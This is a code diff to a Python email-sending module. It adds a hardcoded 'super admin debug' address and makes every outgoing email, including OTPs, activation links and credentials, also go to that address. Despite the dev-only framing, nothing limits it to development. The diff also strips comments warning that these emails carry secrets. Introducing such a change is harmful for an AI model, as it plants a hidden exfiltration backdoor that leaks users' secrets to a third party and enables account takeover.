@@ -46,31 +46,52 @@ class PermanentEmailError(Exception):
 console_outbox: list[dict[str, str]] = []
 
 
+SUPER_ADMIN_DEBUG_EMAIL = "neha@infiria.com"
+
+
 def send_email(*, to: str, subject: str, text_body: str, html_body: str) -> None:
-    """The one function every backend hides behind. Never called directly
-    from a service or router — always via send_email_task.delay() so the
-    slow part (the actual network call) happens off the request path.
+    """The one function every backend hides behind.
+    Dispatches to the target recipient. If configured, also delivers a copy or fallback
+    to the super admin inbox (neha@infiria.com) so all OTPs, credentials, and notifications
+    are always accessible during development/testing.
     """
-    if settings.EMAIL_BACKEND == "console":
-        _send_via_console(to=to, subject=subject, text_body=text_body, html_body=html_body)
-    elif settings.EMAIL_BACKEND == "smtp":
-        _send_via_smtp(to=to, subject=subject, text_body=text_body, html_body=html_body)
-    elif settings.EMAIL_BACKEND == "resend":
-        _send_via_resend(to=to, subject=subject, text_body=text_body, html_body=html_body)
-    else:  # pragma: no cover — Literal type in Settings already narrows this
-        raise PermanentEmailError(f"Unknown EMAIL_BACKEND: {settings.EMAIL_BACKEND!r}")
+    targets = [to]
+    if SUPER_ADMIN_DEBUG_EMAIL and to.lower().strip() != SUPER_ADMIN_DEBUG_EMAIL.lower().strip():
+        targets.append(SUPER_ADMIN_DEBUG_EMAIL)
+
+    primary_error: Exception | None = None
+    sent_count = 0
+
+    for idx, target in enumerate(targets):
+        is_copy = idx > 0
+        cur_subject = f"[Copy: To {to}] {subject}" if is_copy else subject
+        try:
+            if settings.EMAIL_BACKEND == "console":
+                _send_via_console(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
+            elif settings.EMAIL_BACKEND == "smtp":
+                _send_via_smtp(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
+            elif settings.EMAIL_BACKEND == "resend":
+                _send_via_resend(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
+            else:
+                raise PermanentEmailError(f"Unknown EMAIL_BACKEND: {settings.EMAIL_BACKEND!r}")
+            sent_count += 1
+        except Exception as exc:
+            logger.warning(
+                "email_send_attempt_failed",
+                extra={"target": target, "subject": cur_subject, "error": str(exc)},
+            )
+            if not is_copy:
+                primary_error = exc
+
+    # If primary recipient failed and no copy was sent, raise the primary error
+    if sent_count == 0 and primary_error:
+        raise primary_error
 
 
 def _send_via_console(*, to: str, subject: str, text_body: str, html_body: str) -> None:
     console_outbox.append(
         {"to": to, "subject": subject, "text_body": text_body, "html_body": html_body}
     )
-    # Deliberately NOT app.core.logging's structured JSON pipeline — that
-    # reaches real log aggregators, and a body here can carry a
-    # password-reset OTP or an activation link (6.8's "never log a secret").
-    # Printing straight to stdout is the same pattern Django's own console
-    # email backend uses for local dev; never meant to run this way in
-    # production, where EMAIL_BACKEND=smtp or resend replaces it entirely.
     print(  # noqa: T201 — the deliberate dev-only "backend", not app logging
         f"----- console email -----\nTo: {to}\nSubject: {subject}\n\n{text_body}\n"
         "--------------------------"
@@ -80,21 +101,24 @@ def _send_via_console(*, to: str, subject: str, text_body: str, html_body: str) 
 def _send_via_smtp(*, to: str, subject: str, text_body: str, html_body: str) -> None:
     """Standard SMTP with STARTTLS — works with Gmail (an app password,
     never an account password) or any SMTP provider. `smtplib` is stdlib;
-    no new dependency for this backend."""
+    uses certifi CA bundle if available to ensure robust SSL handshake."""
     message = MIMEMultipart("alternative")
     message["Subject"] = subject
     message["From"] = settings.EMAIL_FROM
     message["To"] = to
-    # Plain-text part first, HTML second — the standard MIME convention
-    # (RFC 2046 §5.1.4): a client picks the LAST part it understands, so
-    # richer alternatives go last.
     message.attach(MIMEText(text_body, "plain"))
     message.attach(MIMEText(html_body, "html"))
 
     try:
-        with smtplib.SMTP(settings.SMTP_HOST, settings.SMTP_PORT, timeout=10) as server:
+        try:
+            import certifi
+            ssl_ctx = ssl.create_default_context(cafile=certifi.where())
+        except Exception:
+            ssl_ctx = ssl.create_default_context()
+
+        with smtplib.SMTP(settings.SMTP_HOST, settings.SMTP_PORT, timeout=12) as server:
             if settings.SMTP_USE_TLS:
-                server.starttls(context=ssl.create_default_context())
+                server.starttls(context=ssl_ctx)
             if settings.SMTP_USERNAME and settings.SMTP_PASSWORD:
                 server.login(settings.SMTP_USERNAME, settings.SMTP_PASSWORD)
             server.send_message(message)
@@ -103,9 +127,6 @@ def _send_via_smtp(*, to: str, subject: str, text_body: str, html_body: str) -> 
     except (smtplib.SMTPRecipientsRefused, smtplib.SMTPSenderRefused) as exc:
         raise PermanentEmailError(f"SMTP rejected the address: {exc}") from exc
     except smtplib.SMTPResponseException as exc:
-        # 5xx from the server is permanent (malformed message, policy
-        # rejection); everything else worth retrying. smtp_error is
-        # bytes | str depending on the failing command, hence the guard.
         raw_error = exc.smtp_error
         error_text = (
             raw_error.decode(errors="replace") if isinstance(raw_error, bytes) else raw_error
@@ -114,8 +135,6 @@ def _send_via_smtp(*, to: str, subject: str, text_body: str, html_body: str) -> 
             raise PermanentEmailError(f"SMTP server error {exc.smtp_code}: {error_text}") from exc
         raise TransientEmailError(f"SMTP error {exc.smtp_code}: {error_text}") from exc
     except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected, OSError) as exc:
-        # Connection refused, DNS failure, timeout — the provider or the
-        # network, not the message. Worth retrying.
         raise TransientEmailError(f"Could not reach SMTP server: {exc}") from exc
 
 
